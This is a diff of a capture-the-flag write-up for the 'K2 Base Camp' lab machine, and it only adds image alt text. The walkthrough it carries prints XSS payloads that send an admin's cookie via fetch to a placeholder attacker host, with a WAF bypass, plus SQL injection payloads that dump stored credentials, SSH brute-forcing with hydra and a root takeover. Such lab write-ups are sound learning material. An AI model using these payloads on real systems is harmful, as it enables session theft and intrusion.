@@ -32,13 +32,13 @@ I performed an **nmap** aggressive scan on the target and found 2 open ports, 22
 nmap -A -p- k2.thm --min-rate 10000 -oN k2.nmap
 ```
 
-![](https://cdn.ziomsec.com/k2-basecamp/1.webp)
+![performing an nmap scan on the base camp machine](https://cdn.ziomsec.com/k2-basecamp/1.webp)
 
 ## Initial Foothold
 
 I mapped the *k2.thm* domain to the IP address in my host file and accessed the site through my browser.
 
-![](https://cdn.ziomsec.com/k2-basecamp/2.webp)
+![accessing the web application](https://cdn.ziomsec.com/k2-basecamp/2.webp)
 
 The home page contained nothing of interest, so I used **ffuf** to enumerate subdomains and found some.
 
@@ -46,17 +46,17 @@ The home page contained nothing of interest, so I used **ffuf** to enumerate sub
 ffuf -u http://k2.thm -H "Host: FUZZ.k2.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 13229
 ```
 
-![](https://cdn.ziomsec.com/k2-basecamp/3.webp)
+![enumerating subdomains for the web app](https://cdn.ziomsec.com/k2-basecamp/3.webp)
 
 I updated my host file and accessed the subdomains. Both of them required us to log in using a username and password.
 
-![](https://cdn.ziomsec.com/k2-basecamp/4.webp)
+![accessing the discovered subdomain](https://cdn.ziomsec.com/k2-basecamp/4.webp)
 
-![](https://cdn.ziomsec.com/k2-basecamp/5.webp)
+![accessing the discovered subdomain](https://cdn.ziomsec.com/k2-basecamp/5.webp)
 
 The *it.k2.thm* domain allowed us to register a new user. So I registered a user and logged in. After logging in, I had 2 input fields. I could give a title and a description. Since this was a ticket system, it would likely be reviewed by a privileged user.
 
-![](https://cdn.ziomsec.com/k2-basecamp/6.webp)
+![ticketing system](https://cdn.ziomsec.com/k2-basecamp/6.webp)
 
 I entered a random title and description and got a confirmation that the ticket was being sent for review. I used **Burp**'s **Repeater** tab to test for cross site scripting by making the target send an HTTP request on a web server hosted locally. I used the following script in the title and description and encoded it:
 
@@ -65,11 +65,11 @@ Title: <script src='http://ATTACKER_IP/title'></script>
 Description: <script src='http://ATTACKER_IP/description'></script>
 ```
 
-![](https://cdn.ziomsec.com/k2-basecamp/7.webp)
+![testing for ssrf](https://cdn.ziomsec.com/k2-basecamp/7.webp)
 
 I started an **http** server locally and started receiving requests for the */desc* endpoint, this meant that the description field was vulnerable to cross site scripting.
 
-![](https://cdn.ziomsec.com/k2-basecamp/8.webp)
+![receiving callbacks](https://cdn.ziomsec.com/k2-basecamp/8.webp)
 
 I then used the following payload to send a base64 encoded cookie of the privileged user interacting with our ticket to our web server.
 
@@ -81,7 +81,7 @@ fetch('http://ATTACKER/cookie='+btoa(document.cookie));
 
 However, this activated the WAF and got blocked.
 
-![](https://cdn.ziomsec.com/k2-basecamp/9.webp)
+![attempting to steal cookie](https://cdn.ziomsec.com/k2-basecamp/9.webp)
 
 I then reviewed my payload and modified its characters to find what caused the WAF to block it. I found that *document.cookie* was the problem. So, I used **ChatGPT** to find alternate ways to write *document.cookie* and found a method. 
 
@@ -95,7 +95,7 @@ fetch('http://ATTACKER/cookie='+btoa(document["cookie"]));
 
 My web server received the cookie value from the target.
 
-![](https://cdn.ziomsec.com/k2-basecamp/10.webp)
+![stealing the admin accokie](https://cdn.ziomsec.com/k2-basecamp/10.webp)
 
 I decoded the cookie.
 
@@ -103,19 +103,19 @@ I decoded the cookie.
 echo 'COOKIE' | base64 -d
 ```
 
-![](https://cdn.ziomsec.com/k2-basecamp/11.webp)
+![decoding the admin cookie](https://cdn.ziomsec.com/k2-basecamp/11.webp)
 
 I then added this value to the *admin.k2.thm*.
 
-![](https://cdn.ziomsec.com/k2-basecamp/12.webp)
+![logging into the admin panel](https://cdn.ziomsec.com/k2-basecamp/12.webp)
 
 Since the *ticket.k2.thm* domain had a *dashboard* endpoint, this would also have the same. So I directly navigated to the *dashboard* endpoint and got access to it.
 
-![](https://cdn.ziomsec.com/k2-basecamp/13.webp)
+![accessing admin dashboard](https://cdn.ziomsec.com/k2-basecamp/13.webp)
 
 I could filter tickets based on the titles. This functionality could be running on an sql server in the backend, so I forwarded a request made here to **Burp**'s **Repeater** tab.
 
-![](https://cdn.ziomsec.com/k2-basecamp/14.webp)
+![inspecting admin functionality](https://cdn.ziomsec.com/k2-basecamp/14.webp)
 
 I tried a simple payload but got blocked by the WAF.
 
@@ -123,7 +123,7 @@ I tried a simple payload but got blocked by the WAF.
 ' OR 1=1-- -
 ```
 
-![](https://cdn.ziomsec.com/k2-basecamp/15.webp)
+![testing for sql injection](https://cdn.ziomsec.com/k2-basecamp/15.webp)
 
 However, when I removed the space between `'` and `OR`, I was able to bypass the filter...
 
@@ -131,7 +131,7 @@ However, when I removed the space between `'` and `OR`, I was able to bypass the
 'OR 1=1-- -
 ```
 
-![](https://cdn.ziomsec.com/k2-basecamp/16.webp)
+![testing for sql injection](https://cdn.ziomsec.com/k2-basecamp/16.webp)
 
 I then enumerated the number of columns and columns that were reflected back to us:
 
@@ -139,7 +139,7 @@ I then enumerated the number of columns and columns that were reflected back to 
 'UNION SELECT 1,2,3-- -
 ```
 
-![](https://cdn.ziomsec.com/k2-basecamp/17.webp)
+![enumerating number of columns](https://cdn.ziomsec.com/k2-basecamp/17.webp)
 
 After finding out the columns, I enumerated the table names present in the current database:
 
@@ -147,7 +147,7 @@ After finding out the columns, I enumerated the table names present in the curre
 'UNION SELECT NULL,NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
 ```
 
-![](https://cdn.ziomsec.com/k2-basecamp/18.webp)
+![enumerating table names](https://cdn.ziomsec.com/k2-basecamp/18.webp)
 
 The *admin_auth* and *auth_users* seemed interesting, so I enumerated the columns in these tables:
 
@@ -155,7 +155,7 @@ The *admin_auth* and *auth_users* seemed interesting, so I enumerated the column
 'UNION SELECT NULL,NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name="admin_auth"-- -
 ```
 
-![](https://cdn.ziomsec.com/k2-basecamp/19.webp)
+![enumerating table columns](https://cdn.ziomsec.com/k2-basecamp/19.webp)
 
 I then looked at the contents inside the *admin_auth* table and found a bunch of username and passwords:
 
@@ -163,7 +163,7 @@ I then looked at the contents inside the *admin_auth* table and found a bunch of
 'UNION SELECT admin_username,NULL,admin_password FROM admin_auth-- -
 ```
 
-![](https://cdn.ziomsec.com/k2-basecamp/20.webp)
+![discovering the user credentials](https://cdn.ziomsec.com/k2-basecamp/20.webp)
 
 I created a wordlist of usernames and passwords and brute forced a valid **ssh** credential using **hydra**.
 
@@ -171,7 +171,7 @@ I created a wordlist of usernames and passwords and brute forced a valid **ssh**
 hydra -L users -P passwords ssh://k2.thm
 ```
 
-![](https://cdn.ziomsec.com/k2-basecamp/21.webp)
+![bruteforcing ssh credentials](https://cdn.ziomsec.com/k2-basecamp/21.webp)
 
 I then logged into the system as *james*.
 
@@ -181,7 +181,7 @@ ssh james@k2.thm
 
 Finally, I captured the user flag from *james*'s home directory.
 
-![](https://cdn.ziomsec.com/k2-basecamp/22.webp)
+![capturing the user flag](https://cdn.ziomsec.com/k2-basecamp/22.webp)
 
 ## Privilege Escalation
 
@@ -191,11 +191,11 @@ Viewing the group membership of *james* revealed that he was part of the *adm* g
 groups
 ```
 
-![](https://cdn.ziomsec.com/k2-basecamp/23.webp)
+![viewing authentication log](https://cdn.ziomsec.com/k2-basecamp/23.webp)
 
 I then went through various log files and found a password inside the *nginx* access log.
 
-![](https://cdn.ziomsec.com/k2-basecamp/24.webp)
+![discovering root password](https://cdn.ziomsec.com/k2-basecamp/24.webp)
 
 The password was used with the *rose* user but when i tried using it to switch to *rose*, it failed. I then tried using it against *root* and got access as *root*.
 
@@ -203,19 +203,19 @@ The password was used with the *rose* user but when i tried using it to switch t
 su root
 ```
 
-![](https://cdn.ziomsec.com/k2-basecamp/25.webp)
+![escalating to root](https://cdn.ziomsec.com/k2-basecamp/25.webp)
 
 I then captured the *root* flag.
 
-![](https://cdn.ziomsec.com/k2-basecamp/26.webp)
+![capturing the root flag](https://cdn.ziomsec.com/k2-basecamp/26.webp)
 
 As root, I was able to read the contents inside *rose*'s home directory and found her password in the bash history file.
 
-![](https://cdn.ziomsec.com/k2-basecamp/27.webp)
+![viewing rose password](https://cdn.ziomsec.com/k2-basecamp/27.webp)
 
 The */etc/passwd* file also had something unusual, it had the full names of the users Rose and James. I kept note of that as it could be useful in the future.
 
-![](https://cdn.ziomsec.com/k2-basecamp/28.webp)
+![viewing the /etc/passwd file](https://cdn.ziomsec.com/k2-basecamp/28.webp)
 
 After successfully pwning the base camp, I moved onto the middle camp.
 
